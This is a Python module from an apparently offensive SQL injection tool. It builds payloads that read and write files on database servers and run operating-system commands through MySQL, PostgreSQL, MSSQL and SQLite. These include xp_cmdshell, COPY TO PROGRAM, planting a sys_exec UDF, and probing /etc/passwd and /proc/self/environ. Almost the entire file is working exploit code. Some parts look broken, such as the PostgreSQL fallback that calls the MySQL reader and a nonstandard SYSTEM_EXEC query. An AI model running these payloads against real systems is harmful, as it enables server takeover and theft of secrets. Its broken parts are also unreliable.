"""
File Operations Engine - Read/write files via SQLi, OS command execution
"""

import base64
import hashlib
import random
import string
from typing import Callable, Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class FileOpResult:
    operation: str
    path: str
    content: str
    success: bool
    confidence: float
    technique: str
    dbms: str
    size: int


class FileOperations:
    def __init__(self, request_func: Callable = None):
        self.request = request_func

    # ── File Read ─────────────────────────────────────────────────

    def read_file(self, path: str, dbms: str, param: str = "id",
                  encode: str = None) -> FileOpResult:
        """Read file from database server"""
        if "MySQL" in dbms or "MariaDB" in dbms:
            return self._mysql_read(path, encode)
        elif "PostgreSQL" in dbms:
            return self._postgres_read(path)
        elif "MSSQL" in dbms:
            return self._mssql_read(path)
        elif "SQLite" in dbms:
            return self._sqlite_read(path)
        else:
            return FileOpResult("read", path, "", False, 0, "N/A", dbms, 0)

    def _mysql_read(self, path: str, encode: str = None) -> FileOpResult:
        """Read file using MySQL LOAD_FILE"""
        func = f"LOAD_FILE('{path}')"
        if encode == "hex":
            func = f"HEX({func})"
        elif encode == "base64":
            func = f"TO_BASE64({func})"

        payload = f"' UNION SELECT {func}-- -"
        try:
            response = self.request(payload)
            if response and len(response) > 10:
                content = self._extract_content(response)
                return FileOpResult(
                    "read", path, content, True, 0.9,
                    "LOAD_FILE", "MySQL", len(content)
                )
        except Exception as e:
            return FileOpResult("read", path, str(e), False, 0, "LOAD_FILE", "MySQL", 0)

        return FileOpResult("read", path, "", False, 0, "LOAD_FILE", "MySQL", 0)

    def _postgres_read(self, path: str) -> FileOpResult:
        """Read file using PostgreSQL pg_read_file"""
        payload = f"' UNION SELECT pg_read_file('{path}')-- -"
        try:
            response = self.request(payload)
            content = self._extract_content(response)
            if content:
                return FileOpResult("read", path, content, True, 0.85, "pg_read_file", "PostgreSQL", len(content))
        except Exception:
            pass

        # Try with COPY
        payload = f"'; COPY (SELECT pg_read_file('{path}')) TO '/tmp/out';-- -"
        try:
            self.request(payload)
            # Then read the temp file
            return self._mysql_read("/tmp/out")
        except Exception:
            pass

        return FileOpResult("read", path, "", False, 0, "pg_read_file", "PostgreSQL", 0)

    def _mssql_read(self, path: str) -> FileOpResult:
        """Read file using MSSQL"""
        results = []

        # Try OPENROWSET
        payload = (f"' UNION SELECT * FROM OPENROWSET(BULK N'{path}', "
                   f"SINGLE_CLOB) AS contents-- -")
        try:
            response = self.request(payload)
            content = self._extract_content(response)
            if content:
                results.append(FileOpResult("read", path, content, True, 0.7, "OPENROWSET", "MSSQL", len(content)))
        except Exception:
            pass

        # Try xp_cmdshell with type
        payload = f"'; EXEC xp_cmdshell 'type {path}';-- -"
        try:
            response = self.request(payload)
            content = self._extract_content(response)
            if content:
                results.append(FileOpResult("read", path, content, True, 0.6, "xp_cmdshell type", "MSSQL", len(content)))
        except Exception:
            pass

        return results[0] if results else FileOpResult("read", path, "", False, 0, "OPENROWSET", "MSSQL", 0)

    def _sqlite_read(self, path: str) -> FileOpResult:
        """Read file using SQLite"""
        payload = f"' UNION SELECT readfile('{path}')-- -"
        try:
            response = self.request(payload)
            content = self._extract_content(response)
            if content:
                return FileOpResult("read", path, content, True, 0.7, "readfile", "SQLite", len(content))
        except Exception:
            pass
        return FileOpResult("read", path, "", False, 0, "readfile", "SQLite", 0)

    # ── File Write ────────────────────────────────────────────────

    def write_file(self, path: str, content: str, dbms: str) -> FileOpResult:
        """Write file to database server"""
        if "MySQL" in dbms or "MariaDB" in dbms:
            return self._mysql_write(path, content)
        elif "PostgreSQL" in dbms:
            return self._postgres_write(path, content)
        elif "MSSQL" in dbms:
            return self._mssql_write(path, content)
        else:
            return FileOpResult("write", path, "", False, 0, "N/A", dbms, 0)

    def _mysql_write(self, path: str, content: str) -> FileOpResult:
        """Write file using MySQL INTO OUTFILE/DUMPFILE"""
        hex_content = content.encode().hex()
        results = []

        # INTO OUTFILE
        payload = f"' UNION SELECT '{content}' INTO OUTFILE '{path}'-- -"
        try:
            self.request(payload)
            results.append(FileOpResult("write", path, content, True, 0.7, "INTO OUTFILE", "MySQL", len(content)))
        except Exception as e:
            results.append(FileOpResult("write", path, str(e), False, 0.3, "INTO OUTFILE", "MySQL", 0))

        # INTO DUMPFILE (binary)
        payload = f"' UNION SELECT UNHEX('{hex_content}') INTO DUMPFILE '{path}'-- -"
        try:
            self.request(payload)
            results.append(FileOpResult("write", path, content, True, 0.8, "INTO DUMPFILE", "MySQL", len(content)))
        except Exception:
            pass

        return results[0] if results else FileOpResult("write", path, "", False, 0, "INTO OUTFILE", "MySQL", 0)

    def _postgres_write(self, path: str, content: str) -> FileOpResult:
        """Write file using PostgreSQL COPY"""
        # Write via COPY ... TO
        payload = f"'; COPY (SELECT '{content}') TO '{path}';-- -"
        try:
            self.request(payload)
            return FileOpResult("write", path, content, True, 0.7, "COPY TO", "PostgreSQL", len(content))
        except Exception as e:
            return FileOpResult("write", path, str(e), False, 0.3, "COPY TO", "PostgreSQL", 0)

    def _mssql_write(self, path: str, content: str) -> FileOpResult:
        """Write file using MSSQL"""
        # Try xp_cmdshell with echo
        payload = f"'; EXEC xp_cmdshell 'echo {content} > {path}';-- -"
        try:
            self.request(payload)
            return FileOpResult("write", path, content, True, 0.5, "xp_cmdshell echo", "MSSQL", len(content))
        except Exception as e:
            return FileOpResult("write", path, str(e), False, 0.2, "xp_cmdshell echo", "MSSQL", 0)

    # ── OS Command Execution ──────────────────────────────────────

    def execute_command(self, command: str, dbms: str) -> FileOpResult:
        """Execute OS command via SQLi"""
        if "MySQL" in dbms or "MariaDB" in dbms:
            # Try User-Defined Function
            payload = f"'; SELECT sys_exec('{command}');-- -"
            try:
                response = self.request(payload)
                return FileOpResult("exec", command, response, True, 0.4, "sys_exec UDF", dbms, 0)
            except Exception:
                pass

            # Try xp_cmdshell emulation
            payload = (f"' UNION SELECT {self._build_mysql_exec(command)}-- -")
            try:
                response = self.request(payload)
                return FileOpResult("exec", command, response[:1000], True, 0.3, "mysql_exec", dbms, 0)
            except Exception:
                pass

        elif "MSSQL" in dbms:
            # xp_cmdshell
            payload = f"'; EXEC xp_cmdshell '{command}';-- -"
            try:
                response = self.request(payload)
                return FileOpResult("exec", command, response[:1000], True, 0.7, "xp_cmdshell", dbms, 0)
            except Exception:
                pass

        elif "PostgreSQL" in dbms:
            # COPY with program
            payload = f"'; COPY (SELECT '') TO PROGRAM '{command}';-- -"
            try:
                self.request(payload)
                return FileOpResult("exec", command, "", True, 0.5, "COPY PROGRAM", dbms, 0)
            except Exception:
                pass

        return FileOpResult("exec", command, "", False, 0, "N/A", dbms, 0)

    def _build_mysql_exec(self, command: str) -> str:
        """Build MySQL-specific command execution query"""
        return f"DO SYSTEM_EXEC('{command}')"

    # ── UDF Management ────────────────────────────────────────────

    def deploy_udf(self, lib_path: str, dbms: str) -> FileOpResult:
        """Deploy UDF (User-Defined Function) for command execution"""
        if "MySQL" in dbms or "MariaDB" in dbms:
            payload = f"'; CREATE FUNCTION sys_exec RETURNS INTEGER SONAME '{lib_path}';-- -"
            try:
                self.request(payload)
                return FileOpResult("udf", lib_path, "", True, 0.6, "CREATE FUNCTION", dbms, 0)
            except Exception as e:
                return FileOpResult("udf", lib_path, str(e), False, 0, "CREATE FUNCTION", dbms, 0)
        return FileOpResult("udf", lib_path, "", False, 0, "N/A", dbms, 0)

    def list_udfs(self, dbms: str) -> List[str]:
        """List loaded UDFs"""
        if "MySQL" in dbms or "MariaDB" in dbms:
            payload = "' UNION SELECT CONCAT(name, '@', dl) FROM mysql.func-- -"
            try:
                response = self.request(payload)
                return self._extract_list(response)
            except Exception:
                pass
        return []

    # ── Helper Methods ────────────────────────────────────────────

    def _extract_content(self, response: str) -> str:
        """Extract meaningful content from HTML response"""
        lines = response.split("\n")
        for line in lines:
            line = line.strip()
            if len(line) > 10 and not line.lower().startswith(("<", "<!", "http", "server")):
                return line[:5000]
        return response[:5000] if response else ""

    def _extract_list(self, response: str) -> List[str]:
        """Extract list items from response"""
        items = []
        lines = response.split("\n")
        for line in lines:
            line = line.strip()
            if len(line) > 1 and len(line) < 500 and not line.startswith("<"):
                items.append(line)
        return items

    def test_read_privileges(self, dbms: str) -> Dict[str, bool]:
        """Test file read capabilities"""
        test_files = {
            "Linux": ["/etc/passwd", "/etc/hostname", "/proc/self/environ"],
            "Windows": ["C:\\Windows\\system32\\drivers\\etc\\hosts",
                        "C:\\boot.ini", "C:\\Windows\\win.ini"],
        }
        results = {}
        for os_type, files in test_files.items():
            for f in files:
                res = self.read_file(f, dbms)
                results[f] = res.success
                if res.success:
                    break
        return results
